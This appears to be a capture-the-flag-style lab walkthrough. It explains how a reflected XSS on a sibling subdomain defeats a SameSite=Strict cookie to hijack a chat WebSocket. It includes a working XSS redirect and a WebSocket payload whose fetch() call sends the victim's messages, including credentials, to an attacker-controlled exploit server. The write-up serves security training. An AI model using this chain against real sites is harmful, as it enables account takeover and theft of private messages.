# Lab 9: SameSite Strict bypass via sibling domain

**Difficulty:** Practitioner

**Prerequisite:** WebSockets (this is cross-site WebSocket hijacking - see `websockets/lab-03-cross-site-websocket-hijacking`).

## Goal

The main site's live chat uses a `SameSite=Strict` session cookie. Exfiltrate the victim's chat history (which contains their credentials) and log in as them.

## Why Strict is the obstacle

`SameSite=Strict` never sends the session cookie on a cross-site request, so a WebSocket opened from an attacker-controlled site cannot authenticate. The cookie only rides on **same-site** requests.

## The sibling domain

A CMS lives at `cms-LAB-ID.web-security-academy.net`, a sibling of the main `LAB-ID.web-security-academy.net`. Both are under `web-security-academy.net`, so they are **same-site**. The CMS login has a **reflected XSS** in the `username` parameter. Running the CSWSH script there makes the WebSocket handshake a same-site request, so the Strict cookie attaches.

## Exploit

Host on the exploit server; it redirects the victim to the CMS login with the CSWSH script URL-encoded into `username`.

```html
<script>
document.location = "https://cms-LAB-ID.web-security-academy.net/login?username=<script>var+ws%3dnew+WebSocket('wss://LAB-ID.web-security-academy.net/chat')%3bws.onopen%3dfunction(){ws.send('READY')}%3bws.onmessage%3dfunction(event){fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/exfil%3fd%3d'%2bencodeURIComponent(event.data))}%3b<%2fscript>&password=x";
</script>
```

The injected script (after decoding) is the standard CSWSH payload:

```javascript
var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
ws.onopen = function(){ ws.send('READY'); };
ws.onmessage = function(event){
  fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/exfil?d=' + encodeURIComponent(event.data));
};
```

## Steps

1. Confirm the CMS login reflects `username` unsanitised (`?username=<script>alert(1)</script>` fires)
2. Store the exploit on the exploit server and Deliver to victim (View exploit only exfiltrates your own chat)
3. Read the exploit server access log for the victim's messages (user-agent shows `(Victim)`)
4. The credential message: Hal Pline tells carlos his password. Log in as carlos to solve

## Encoding notes

- `+` decodes to a space, `%3d` to `=`, `%3b` to `;`, `%3f` to `?`, `%2b` to `+`
- `<%2fscript>` encodes the inner closing tag so the outer `<script>` block does not terminate early when the browser parses the exploit page

## Takeaway

SameSite=Strict only isolates by site, not by origin. Any XSS on a sibling subdomain runs in a same-site context, so it can carry the Strict cookie into requests (including a WebSocket handshake) that the main origin trusts. Subdomains are part of your attack surface.
